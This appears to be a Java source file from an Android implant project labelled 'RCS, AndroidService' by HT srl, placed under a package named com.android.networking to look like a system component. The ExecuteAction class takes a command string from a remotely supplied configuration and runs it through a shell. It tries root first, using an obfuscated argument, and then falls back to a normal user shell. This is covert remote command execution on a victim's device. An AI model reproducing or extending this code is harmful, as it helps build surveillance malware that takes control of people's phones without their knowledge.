/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ExecuteAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action;

import java.io.IOException;

import org.json.JSONObject;

import android.util.Log;

import com.android.networking.Messages;
import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.conf.Configuration;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.event.BaseEvent;
import com.android.networking.file.Directory;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public class ExecuteAction extends SubActionSlow {
	private static final String TAG = "ExecuteAction";

	private String command;

	/**
	 * Instantiates a new execute action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public ExecuteAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		if (this.command.length() == 0)
			return false;

		// Proviamo ad eseguire il comando da root
		try {
			String cmd[] = { Configuration.shellFile, Messages.getString("35.0"), this.command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}

		// Proviamo ad eseguire il comando da utente normale
		try {
			String cmd[] = { Messages.getString("35.1"), "-c", this.command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
			}
		}

		return false;
	}

	@Override
	protected boolean parse(final ConfAction params) {
		try {
			this.command = params.getString("command");

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + this.command);
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");
			}

			return false;
		}

		return true;
	}
}
